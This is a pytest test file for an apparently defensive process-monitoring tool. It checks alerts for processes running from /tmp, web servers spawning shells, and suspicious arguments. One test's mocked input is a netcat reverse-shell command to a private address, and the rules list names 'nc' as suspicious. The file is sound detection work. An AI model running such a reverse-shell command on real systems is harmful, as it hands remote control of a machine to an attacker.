import pytest
import os
import tempfile
import json
from unittest.mock import MagicMock, patch
import psutil

# Add process_sentinel to sys.path so we can import sentinel
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from sentinel import ProcessSentinel

@pytest.fixture
def temp_rules_file():
    rules = {
        "suspicious_paths": ["/tmp"],
        "web_server_processes": ["nginx"],
        "shell_processes": ["bash"],
        "suspicious_args": ["nc"]
    }
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        json.dump(rules, f)
        temp_name = f.name

    yield temp_name

    os.remove(temp_name)

@pytest.fixture
def sentinel(temp_rules_file):
    return ProcessSentinel(temp_rules_file)

def mock_process(pid, name, exe, cmdline, ppid=1):
    mock = MagicMock()
    mock.pid = pid
    mock.name.return_value = name
    mock.exe.return_value = exe
    mock.cmdline.return_value = cmdline
    mock.ppid.return_value = ppid
    return mock

def test_benign_process(sentinel):
    proc = mock_process(1234, "ls", "/bin/ls", ["ls", "-l"])
    result = sentinel.evaluate_process(proc)
    assert result == {}

def test_suspicious_path(sentinel):
    proc = mock_process(1235, "malware", "/tmp/malware", ["/tmp/malware"])
    result = sentinel.evaluate_process(proc)
    assert result != {}
    assert len(result["alerts"]) == 1
    assert "suspicious path" in result["alerts"][0]
    assert result["pid"] == 1235

def test_suspicious_args(sentinel):
    proc = mock_process(1236, "bash", "/bin/bash", ["bash", "-c", "nc 10.0.0.1 4444 -e /bin/sh"])
    result = sentinel.evaluate_process(proc)
    assert result != {}
    assert len(result["alerts"]) == 1
    assert "Suspicious argument 'nc'" in result["alerts"][0]

def test_web_server_spawning_shell(sentinel):
    with patch('sentinel.psutil.Process') as mock_psutil_process:
        # Mock the shell process
        shell_proc = mock_process(1237, "bash", "/bin/bash", ["bash"], ppid=1236)

        # Mock the web server parent process
        parent_proc = mock_process(1236, "nginx", "/usr/sbin/nginx", ["nginx"])
        mock_psutil_process.return_value = parent_proc

        result = sentinel.evaluate_process(shell_proc)
        assert result != {}
        assert len(result["alerts"]) == 1
        assert "Web server (nginx) spawned a shell (bash)" in result["alerts"][0]

def test_multiple_alerts(sentinel):
    proc = mock_process(1238, "bash", "/tmp/bash", ["/tmp/bash", "-c", "nc reverse shell"])
    result = sentinel.evaluate_process(proc)
    assert result != {}
    assert len(result["alerts"]) == 2

def test_process_access_denied(sentinel):
    proc = MagicMock(spec=psutil.Process)
    proc.name.side_effect = psutil.AccessDenied(pid=1239)
    result = sentinel.evaluate_process(proc)
    assert result == {}
